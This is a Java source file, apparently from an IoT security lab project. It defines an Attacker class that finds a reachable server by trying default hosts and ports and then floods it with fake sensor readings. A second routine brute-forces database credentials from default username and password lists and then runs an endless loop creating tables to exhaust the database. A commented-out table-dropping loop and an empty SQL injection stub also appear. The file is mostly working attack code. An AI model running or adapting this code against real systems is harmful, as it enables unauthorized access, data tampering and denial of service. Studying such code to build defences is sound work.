package iot;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.Random;

public class Attacker {

	public static void main(String[] args) {
//		initiateDOSAttack();
		intitiateMaliciousSensorAttack();
	}

	private static void intitiateMaliciousSensorAttack() {
		Socket socket = null;
		System.out.println("Attempting connection to server (Dictionary attack)...");
		for(String server : AttackerRepo.DEFAULT_SERVERS) {
			for(Integer port : AttackerRepo.DEFAULT_PORTS) {
				try {
					socket = new Socket(server, port);
					if(socket != null) {
						break;
					}
				} catch(IOException e) {}
			}
			if(socket != null) {
				break;
			}
		}
		if(socket != null) {
			System.out.println("Dictionary attack success!");
		} else {
			System.out.println("Dictionary attack failure!");
			return;
		}
		while(true) {
			int falseReading = new Random().nextInt(1000);
			/*
			 * Send this reading to the server
			 */
			String falseMsg = String.valueOf(falseReading);
			try {
				PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
				out.println(falseMsg);
			} catch (IOException e) {
				e.printStackTrace();
			}
			try {
				Thread.sleep(1000);
			} catch (InterruptedException e1) {
				e1.printStackTrace();
			}
		}
		/*
		 * Malicious node can do SQL Injection
		 */
//		sqlInjection();
	}

	private static void sqlInjection() {
		
	}

	/**
	 * In the DOS attack, the Database system is kept busy infinitely.
	 */
	private static void initiateDOSAttack() {
		/**
		 * Dictionary Attack
		 */
		System.out.println("Attempting connection to database (Dictionary attack)...");
		Connection conn = null;
		String url = null;
		try {
			Class.forName(AttackerRepo.DRIVER);
			/*
			 * We'll brute force all possibilities
			 */
			for(Integer port : AttackerRepo.DEFAULT_PORTS) {
				for(String server : AttackerRepo.DEFAULT_SERVERS) {
					for(String dbName : AttackerRepo.DEFAULT_DB_NAMES) {
						url = AttackerRepo.HALF_URL + server + ":" + port + "/" + dbName;
						for(String username : AttackerRepo.DEFAULT_USERNAMES) {
							for(String password : AttackerRepo.DEFAULT_PASSWORDS) {
								try {
									/*
									 * Are these right connection credentials?
									 */
									conn = DriverManager.getConnection(url, username, password);
								} catch(SQLException e) {}
								if(conn != null) {
									break;
								}
							}
							if(conn != null) {
								break;
							}
						}
						if(conn != null) {
							break;
						}
					}
					if(conn != null) {
						break;
					}
				}
				if(conn != null) {
					break;
				}
			}
			if(conn != null) {
				System.out.println("Dictionary attack successfull!");
			}
			System.out.println("Running DoS attack...");
			/*
			 * Attacker simply creates random tables with random attributes
			 */
			String str = "a";
			long counter = 0;
			Statement stmt = conn.createStatement();
			while(true) {
				String tableName = str + counter++;
				String query = "CREATE TABLE " + tableName + "("
						+ "ID Integer,"
						+ "Name varchar(25)"
						+ ");";
				stmt.execute(query);
			}
//			while(true) {
//				String tableName = str + counter++;
//				String query = "drop table "+tableName+";";
//				Statement stmt = conn.createStatement();
//				stmt.execute(query);
//			}
		} catch(ClassNotFoundException e) {
			e.printStackTrace();
		} catch (SQLException e) {
			e.printStackTrace();
		}
	}
	
}
